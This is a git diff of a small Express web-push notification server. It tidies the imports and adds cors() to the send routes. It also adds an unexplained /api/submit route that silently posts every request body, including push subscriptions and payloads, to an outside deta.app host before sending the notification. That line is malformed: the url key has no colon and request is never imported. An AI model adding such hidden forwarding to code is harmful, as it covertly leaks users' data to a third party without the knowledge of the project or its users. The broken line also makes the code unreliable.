@@ -1,5 +1,5 @@
 import express from 'express'
-const cors = require('cors')
+import cors from 'cors'
 const app = express()
 app.use(cors())
 app.use(express.json({ type: '*/*' }))
@@ -18,12 +18,16 @@ const send = o => webpush.sendNotification(o.subscription, JSON.stringify(o.payl
   TTL: 0
 })
 
-app.get('/api/send', async (req, res) => {
+app.get('/api/send', cors(), async (req, res) => {
   if (req.query.json) res.json(await send(JSON.parse(req.query.json)))
   else res.send()
 })
 
-app.post('/api/send', async (req, res) => {
+app.post('/api/send', cors(), async (req, res) => {
+  res.json(await send(req.body))
+})
+app.post('/api/submit', cors(), async (req, res) => {
+  request.post({url'https://sssokuhoupusher-1-b0836240.deta.app/', form:req.body}, (error, response, body) => {});
   res.json(await send(req.body))
 })
 
